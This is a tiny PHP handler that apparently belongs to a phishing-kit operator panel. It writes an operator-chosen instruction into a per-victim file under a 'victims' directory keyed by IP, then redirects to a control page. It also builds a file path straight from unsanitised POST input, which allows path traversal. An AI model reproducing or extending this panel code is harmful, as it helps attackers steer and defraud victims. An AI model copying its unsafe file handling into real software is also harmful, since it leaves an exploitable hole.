<?php
	
	if ($_POST['step'] == "control") {
        $fp = fopen('../../../victims/'. $_POST['ip'] .'.txt', 'wb');
        fwrite($fp, $_POST['to']);
        fclose($fp);
        header("location: ../../../control.php?ip=" . $_POST['ip']);
        exit();
    }

?>